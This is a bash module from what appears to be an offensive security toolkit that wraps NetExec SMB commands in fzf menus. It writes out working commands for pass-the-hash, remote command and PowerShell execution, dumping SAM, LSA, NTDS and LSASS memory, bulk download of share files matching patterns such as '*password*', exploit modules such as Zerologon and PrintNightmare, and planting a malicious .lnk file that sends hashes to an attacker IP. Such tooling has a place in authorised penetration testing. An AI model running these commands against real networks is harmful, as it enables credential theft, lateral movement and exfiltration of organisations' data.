#!/bin/bash
#
# NXC SMB Module
# Contains all SMB-related operations for NetExec (NXC)
#
# This module handles:
# - SMB Authentication (test auth, pass-the-hash, local auth, etc.)
# - SMB Enumeration (shares, users, groups, sessions, etc.)
# - SMB Shares (spider_plus, download, upload, browse)
# - SMB Execution (command execution, PowerShell, system info)
# - SMB Credentials (SAM, LSA, NTDS dumps, lsassy, nanodump)
# - SMB Vulnerabilities (MS17-010, Zerologon, PetitPotam, etc.)
#
# Dependencies:
# - build_auth() - builds authentication string from credentials
# - get_target_for_command() - gets target from database/selection
# - run_command() - executes command with logging
# - show_menu() - displays menu using fzf
# - show_downloads() - displays downloaded files
# - parse_spider_plus.py - parses spider_plus JSON output
#
# Global Variables (from config.sh):
# - Colors: RED, GREEN, YELLOW, BLUE, CYAN, MAGENTA, NC
# - Credentials: USERNAME, PASSWORD, DOMAIN, HASH
# - Target: TARGET, RUN_MODE
# - Databases: CREDS_DB, TARGETS_DB
#

# ============================================================================
# SMB Authentication Operations
# ============================================================================
handle_smb_auth() {
    local auth target subchoice domain hash

    auth=$(build_auth)
    target=$(get_target_for_command) || return 1
    subchoice=$(show_menu "smb_auth" "Select Auth Method: ")

    case "$subchoice" in
        "Test Authentication")
            run_command "nxc smb $target $auth"
            ;;
        "Test with Domain")
            domain=${DOMAIN:-WORKGROUP}
            run_command "nxc smb $target $auth -d $domain"
            ;;
        "Pass-the-Hash")
            read -p "NTLM Hash: " hash
            run_command "nxc smb $target -u $USERNAME -H $hash"
            ;;
        "Local Authentication")
            run_command "nxc smb $target $auth --local-auth"
            ;;
    esac
}

# ============================================================================
# SMB Enumeration Operations
# ============================================================================
handle_smb_enum() {
    local auth target subchoice

    auth=$(build_auth)
    target=$(get_target_for_command) || return 1
    subchoice=$(show_menu "smb_enum" "Select Enumeration: ")

    case "$subchoice" in
        "List Shares")
            run_command "nxc smb $target $auth --shares"
            ;;
        "Enumerate Users")
            run_command "nxc smb $target $auth --users"
            ;;
        "Enumerate Local Users")
            run_command "nxc smb $target $auth --local-users"
            ;;
        "Enumerate Groups")
            run_command "nxc smb $target $auth --groups"
            ;;
        "Password Policy")
            run_command "nxc smb $target $auth --pass-pol"
            ;;
        "Active Sessions")
            run_command "nxc smb $target $auth --sessions"
            ;;
        "Logged On Users")
            run_command "nxc smb $target $auth --loggedon-users"
            ;;
        "RID Bruteforce")
            run_command "nxc smb $target $auth --rid-brute"
            ;;
        "List Disks")
            run_command "nxc smb $target $auth --disks"
            ;;
        "Full Enumeration (All)")
            run_command "nxc smb $target $auth --users --groups --shares --sessions --pass-pol --disks"
            ;;
    esac
}

# ============================================================================
# SMB Shares Operations (spider_plus, downloads, uploads)
# ============================================================================
handle_smb_shares() {
    local auth target subchoice

    auth=$(build_auth)
    target=$(get_target_for_command) || return 1
    subchoice=$(show_menu "smb_shares" "Select Share Operation: ")

    case "$subchoice" in
        "Browse & Download Files (Interactive)")
            if [[ "$RUN_MODE" == "all" ]]; then
                echo -e "${YELLOW}Interactive browse only works with single target.${NC}"
                sleep 2
                return
            fi
            echo -e "${CYAN}This will spider shares and list all files, then download them.${NC}"
            read -p "Limit to specific share? (leave empty for all shares): " share_opt
            read -p "File pattern to match? (e.g., *.xlsx, *.txt, or leave empty for all): " pattern_opt

            cmd="nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
            [[ -n "$share_opt" ]] && cmd="$cmd SHARE='$share_opt'"
            [[ -n "$pattern_opt" ]] && cmd="$cmd PATTERN='$pattern_opt'"

            echo -e "\n${GREEN}Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"

            run_command "$cmd"

            echo -e "\n${CYAN}Would you like to view the downloaded files?${NC}"
            read -p "Show downloaded files? (y/n): " show_files
            if [[ "$show_files" == "y" || "$show_files" == "Y" ]]; then
                # Check the primary location first
                if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                    echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                    ls -lhR ~/.nxc/modules/nxc_spider_plus 2>/dev/null | tail -50
                else
                    # Fall back to checking other locations
                    show_downloads
                fi
                read -p "Press Enter to continue..."
            fi
            ;;

        "Download All Files (Recursive)")
            echo -e "${CYAN}This will recursively download ALL files from all shares!${NC}"
            echo -e "${YELLOW}Warning: This may take a while and use disk space.${NC}"
            read -p "Continue? (y/n): " confirm
            if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
                return
            fi

            echo -e "\n${GREEN}Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"
            run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"

            echo -e "\n${CYAN}Download complete!${NC}"
            read -p "Open download directory? (y/n): " open_dir
            if [[ "$open_dir" == "y" || "$open_dir" == "Y" ]]; then
                if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                    echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                    ls -lhR ~/.nxc/modules/nxc_spider_plus 2>/dev/null | tail -50
                else
                    show_downloads
                fi
                read -p "Press Enter to continue..."
            fi
            ;;

        "Download Files by Pattern")
            echo -e "${CYAN}Download only files matching a pattern${NC}"
            echo -e "${CYAN}Examples: *.xlsx, *.docx, *password*, *cred*${NC}"
            read -p "File pattern: " pattern

            if [[ -z "$pattern" ]]; then
                echo -e "${RED}Pattern cannot be empty!${NC}"
                sleep 2
                return
            fi

            echo -e "\n${GREEN}Downloading files matching: $pattern${NC}"
            echo -e "${GREEN}Files will be saved to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"

            run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True PATTERN='$pattern' MAX_FILE_SIZE=512000"

            echo -e "\n${CYAN}Files matching '$pattern' have been downloaded!${NC}"
            read -p "View downloaded files? (y/n): " view
            if [[ "$view" == "y" || "$view" == "Y" ]]; then
                echo -e "\n${GREEN}Searching for downloaded files matching pattern...${NC}"
                if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                    echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                    find ~/.nxc/modules/nxc_spider_plus -type f 2>/dev/null | while read f; do ls -lh "$f"; done | tail -30
                else
                    show_downloads
                fi
                read -p "Press Enter to continue..."
            fi
            ;;

        "Spider & List Only (No Download)")
            echo -e "${CYAN}This will list all files without downloading them${NC}"
            read -p "Limit to specific share? (leave empty for all): " share_opt
            read -p "File pattern? (leave empty for all): " pattern_opt

            cmd="nxc smb $target $auth -M spider_plus"
            [[ -n "$share_opt" ]] && cmd="$cmd -o SHARE='$share_opt'"
            [[ -n "$pattern_opt" ]] && cmd="$cmd -o PATTERN='$pattern_opt'"

            echo -e "\n${GREEN}File list will be saved to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"

            run_command "$cmd"

            echo -e "\n${CYAN}Would you like to view the file list?${NC}"
            read -p "Show JSON file list? (y/n): " show_json
            if [[ "$show_json" == "y" || "$show_json" == "Y" ]]; then
                # Try to find the JSON file
                json_file=$(find ~/.nxc/modules/nxc_spider_plus -name "*.json" -type f 2>/dev/null | head -1)

                if [[ -z "$json_file" ]]; then
                    # Fall back to other locations
                    for dir in ~/.nxc/logs /tmp/nxc_hosted/nxc_spider_plus /tmp/nxc; do
                        if [[ -d "$dir" ]]; then
                            json_file=$(find "$dir" -name "*.json" -type f 2>/dev/null | grep -i spider | head -1)
                            [[ -n "$json_file" ]] && break
                        fi
                    done
                fi

                if [[ -n "$json_file" ]]; then
                    echo -e "\n${GREEN}File: $json_file${NC}\n"
                    cat "$json_file" | jq . 2>/dev/null || cat "$json_file"
                else
                    echo -e "${YELLOW}JSON file not found. Check:${NC}"
                    echo -e "  ~/.nxc/modules/nxc_spider_plus/"
                fi
                read -p "Press Enter to continue..."
            fi
            ;;

        "Spider Specific Share")
            read -p "Share name: " share
            if [[ -z "$share" ]]; then
                echo -e "${RED}Share name cannot be empty!${NC}"
                sleep 2
                return
            fi

            echo -e "\n${CYAN}Choose action:${NC}"
            action=$(echo "List files only
Download all files in share" | fzf --prompt="Select: " --height=30% --reverse)

            case "$action" in
                "List files only")
                    run_command "nxc smb $target $auth -M spider_plus -o SHARE='$share'"
                    ;;
                "Download all files in share")
                    echo -e "\n${GREEN}Downloading all files from share: $share${NC}\n"
                    run_command "nxc smb $target $auth -M spider_plus -o SHARE='$share' DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
                    ;;
            esac
            ;;

        "Parse Spider Results")
            spider_plus_dir="$HOME/.nxc/modules/nxc_spider_plus"

            if [[ ! -d "$spider_plus_dir" ]]; then
                echo -e "${RED}Spider plus directory not found: $spider_plus_dir${NC}"
                echo -e "${YELLOW}Run a spider_plus scan first!${NC}"
                sleep 3
                return
            fi

            # Find available JSON files
            json_files=($(find "$spider_plus_dir" -name "*.json" -type f 2>/dev/null))

            if [[ ${#json_files[@]} -eq 0 ]]; then
                echo -e "${RED}No spider_plus results found in $spider_plus_dir${NC}"
                echo -e "${YELLOW}Run a spider_plus scan first!${NC}"
                sleep 3
                return
            fi

            # Show available options
            echo -e "\n${GREEN}Available spider_plus results:${NC}"
            for json_file in "${json_files[@]}"; do
                ip=$(basename "$json_file" .json)
                echo -e "  - $ip"
            done

            echo -e "\n${CYAN}Parse options:${NC}"
            parse_action=$(echo "Parse specific IP
Parse all results
Back" | fzf --prompt="Select: " --height=30% --reverse)

            case "$parse_action" in
                "Parse specific IP")
                    read -p "Enter IP address: " target_ip

                    if [[ -z "$target_ip" ]]; then
                        echo -e "${RED}IP address cannot be empty!${NC}"
                        sleep 2
                        return
                    fi

                    json_file="$spider_plus_dir/${target_ip}.json"

                    if [[ ! -f "$json_file" ]]; then
                        echo -e "${RED}No results found for IP: $target_ip${NC}"
                        sleep 2
                        return
                    fi

                    # Ask for sort option
                    sort_option=$(echo "share
size
name" | fzf --prompt="Sort by: " --height=30% --reverse)

                    echo -e "\n${GREEN}Parsing results for $target_ip...${NC}\n"

                    # Check if parse_spider_plus.py exists
                    if [[ -f "./parse_spider_plus.py" ]]; then
                        python3 ./parse_spider_plus.py "$target_ip" --sort "${sort_option:-share}"
                    elif [[ -f "/home/user/purplesploit/parse_spider_plus.py" ]]; then
                        python3 /home/user/purplesploit/parse_spider_plus.py "$target_ip" --sort "${sort_option:-share}"
                    else
                        echo -e "${RED}parse_spider_plus.py not found!${NC}"
                    fi

                    read -p "Press Enter to continue..."
                    ;;
                "Parse all results")
                    # Ask for sort option
                    sort_option=$(echo "share
size
name" | fzf --prompt="Sort by: " --height=30% --reverse)

                    echo -e "\n${GREEN}Parsing all spider_plus results...${NC}\n"

                    # Check if parse_spider_plus.py exists
                    if [[ -f "./parse_spider_plus.py" ]]; then
                        python3 ./parse_spider_plus.py --all --sort "${sort_option:-share}"
                    elif [[ -f "/home/user/purplesploit/parse_spider_plus.py" ]]; then
                        python3 /home/user/purplesploit/parse_spider_plus.py --all --sort "${sort_option:-share}"
                    else
                        echo -e "${RED}parse_spider_plus.py not found!${NC}"
                    fi

                    read -p "Press Enter to continue..."
                    ;;
            esac
            ;;

        "Download Specific File (Manual Path)")
            if [[ "$RUN_MODE" == "all" ]]; then
                echo -e "${YELLOW}Manual download only works with single target.${NC}"
                sleep 2
                return
            fi
            echo -e "${CYAN}Remote path must use Windows format with double backslashes${NC}"
            echo -e "${CYAN}Example: \\\\Windows\\\\Temp\\\\passwords.txt${NC}"
            read -p "Remote path: " remote
            read -p "Local path (where to save): " local
            run_command "nxc smb $target $auth --get-file '$remote' '$local'"
            ;;

        "Upload File")
            if [[ "$RUN_MODE" == "all" ]]; then
                echo -e "${YELLOW}Upload only works with single target.${NC}"
                sleep 2
                return
            fi
            read -p "Local path (file to upload): " local
            echo -e "${CYAN}Remote path must use Windows format with double backslashes${NC}"
            echo -e "${CYAN}Example: \\\\Windows\\\\Temp\\\\file.txt${NC}"
            read -p "Remote path: " remote
            run_command "nxc smb $target $auth --put-file '$local' '$remote'"
            ;;
    esac
}

# ============================================================================
# SMB Execution Operations
# ============================================================================
handle_smb_exec() {
    local auth target subchoice cmd ps

    auth=$(build_auth)
    target=$(get_target_for_command) || return 1
    subchoice=$(show_menu "smb_exec" "Select Command: ")

    case "$subchoice" in
        "Execute Command (CMD)")
            read -p "Command: " cmd
            run_command "nxc smb $target $auth -x '$cmd'"
            ;;
        "Execute PowerShell")
            read -p "PowerShell command: " ps
            run_command "nxc smb $target $auth -X '$ps'"
            ;;
        "Get System Info")
            run_command "nxc smb $target $auth -x systeminfo"
            ;;
        "List Processes")
            run_command "nxc smb $target $auth -x 'tasklist /v'"
            ;;
        "Network Configuration")
            run_command "nxc smb $target $auth -x 'ipconfig /all'"
            ;;
        "List Administrators")
            run_command "nxc smb $target $auth -x 'net localgroup administrators'"
            ;;
        "Check Privileges")
            run_command "nxc smb $target $auth -x 'whoami /priv'"
            ;;
    esac
}

# ============================================================================
# SMB Credentials Dumping Operations
# ============================================================================
handle_smb_creds() {
    local auth target subchoice

    auth=$(build_auth)
    target=$(get_target_for_command) || return 1
    subchoice=$(show_menu "smb_creds" "Select Dump Method: ")

    case "$subchoice" in
        "Dump SAM Database")
            run_command "nxc smb $target $auth --sam"
            ;;
        "Dump LSA Secrets")
            run_command "nxc smb $target $auth --lsa"
            ;;
        "Dump NTDS (Domain Controller)")
            run_command "nxc smb $target $auth --ntds"
            ;;
        "Dump All (SAM+LSA+NTDS)")
            run_command "nxc smb $target $auth --sam --lsa --ntds"
            ;;
        "Lsassy (Memory Dump)")
            run_command "nxc smb $target $auth -M lsassy"
            ;;
        "Nanodump")
            run_command "nxc smb $target $auth -M nanodump"
            ;;
        "WiFi Passwords")
            run_command "nxc smb $target $auth -M wifi"
            ;;
    esac
}

# ============================================================================
# SMB Vulnerabilities Scanning Operations
# ============================================================================
handle_smb_vulns() {
    local auth target subchoice

    target=$(get_target_for_command) || return 1
    auth=$(build_auth)
    subchoice=$(show_menu "smb_vulns" "Select Vulnerability: ")

    case "$subchoice" in
        "MS17-010 (EternalBlue)")
            run_command "nxc smb $target -M ms17-010"
            ;;
        "Zerologon (CVE-2020-1472)")
            run_command "nxc smb $target $auth -M zerologon"
            ;;
        "PetitPotam")
            run_command "nxc smb $target $auth -M petitpotam"
            ;;
        "NoPac (CVE-2021-42278)")
            run_command "nxc smb $target $auth -M nopac"
            ;;
        "SMBGhost (CVE-2020-0796)")
            run_command "nxc smb $target -M smbghost"
            ;;
        "PrintNightmare")
            run_command "nxc smb $target $auth -M printnightmare"
            ;;
        "All Vulnerability Checks")
            run_command "nxc smb $target -M ms17-010 && nxc smb $target $auth -M zerologon && nxc smb $target $auth -M petitpotam && nxc smb $target $auth -M nopac"
            ;;
    esac
}

# ============================================================================
# NXC/SMB Utilities - Generate files, modules, and advanced features
# ============================================================================
handle_nxc_utils() {
    local auth target subchoice

    target=$(get_target_for_command) || return 1
    auth=$(build_auth)
    subchoice=$(show_menu "nxc_utils" "Select Utility: ")

    case "$subchoice" in
        "Generate /etc/hosts File")
            read -p "Output file path [default: ./hosts]: " output_file
            [[ -z "$output_file" ]] && output_file="./hosts"
            echo -e "${CYAN}Generating hosts file from target(s)...${NC}"
            run_command "nxc smb $target --generate-hosts-file '$output_file'"
            ;;
        "Generate krb5.conf File")
            read -p "Output file path [default: ./krb5.conf]: " output_file
            [[ -z "$output_file" ]] && output_file="./krb5.conf"
            echo -e "${CYAN}Generating krb5.conf file from target(s)...${NC}"
            run_command "nxc smb $target --generate-krb5-file '$output_file'"
            ;;
        "Slinky Module (Create .lnk for Hash Capture)")
            read -p "Share name to drop .lnk file [default: C$]: " share_name
            [[ -z "$share_name" ]] && share_name="C\$"
            read -p "Attacker IP (for hash capture): " attacker_ip
            if [[ -z "$attacker_ip" ]]; then
                echo -e "${RED}Attacker IP required!${NC}"
                sleep 2
                return 1
            fi
            read -p "LNK filename [default: IMPORTANT]: " lnk_name
            [[ -z "$lnk_name" ]] && lnk_name="IMPORTANT"
            echo -e "${CYAN}Dropping malicious .lnk file to capture hashes...${NC}"
            echo -e "${YELLOW}Make sure responder/ntlmrelayx is running on $attacker_ip!${NC}"
            run_command "nxc smb $target $auth -M slinky -o NAME='$lnk_name' SERVER='$attacker_ip' SHARE='$share_name'"
            ;;
        "Pass-the-Ticket (Use Kerberos Cache)")
            echo -e "${CYAN}Using existing Kerberos ticket from KRB5CCNAME${NC}"
            echo -e "${YELLOW}Make sure KRB5CCNAME is set: export KRB5CCNAME=/path/to/ticket.ccache${NC}"
            run_command "nxc smb $target --use-kcache"
            ;;
        "Kerberos Authentication (-k)")
            echo -e "${CYAN}Using Kerberos authentication with provided credentials${NC}"
            run_command "nxc smb $target $auth -k"
            ;;
        "Spider Plus Module (Enhanced)")
            echo -e "${CYAN}Running spider_plus module for recursive file enumeration${NC}"
            read -p "Download all files? [y/N]: " download_choice
            if [[ "$download_choice" =~ ^[Yy]$ ]]; then
                run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True"
            else
                run_command "nxc smb $target $auth -M spider_plus"
            fi
            ;;
        "NTLMv1 Downgrade (Capture Weak Hashes)")
            echo -e "${CYAN}Attempting to downgrade to NTLMv1...${NC}"
            echo -e "${YELLOW}Make sure responder is running with --lm flag!${NC}"
            run_command "nxc smb $target $auth -M ntlmv1"
            ;;
        "Check SMB Signing")
            echo -e "${CYAN}Checking SMB signing status...${NC}"
            run_command "nxc smb $target --gen-relay-list relay_targets.txt"
            ;;
    esac
}

# ============================================================================
# Main SMB Handler - Routes to appropriate sub-handler
# ============================================================================
handle_smb() {
    local submenu_type="$1"

    case "$submenu_type" in
        "SMB Authentication")
            handle_smb_auth
            ;;
        "SMB Enumeration")
            handle_smb_enum
            ;;
        "SMB Shares")
            handle_smb_shares
            ;;
        "SMB Execution")
            handle_smb_exec
            ;;
        "SMB Credentials")
            handle_smb_creds
            ;;
        "SMB Vulnerabilities")
            handle_smb_vulns
            ;;
        *)
            echo -e "${RED}Unknown SMB submenu type: $submenu_type${NC}"
            return 1
            ;;
    esac
}

# Export all functions for use in other scripts
export -f handle_smb
export -f handle_smb_auth
export -f handle_smb_enum
export -f handle_smb_shares
export -f handle_smb_exec
export -f handle_smb_creds
export -f handle_smb_vulns
export -f handle_nxc_utils
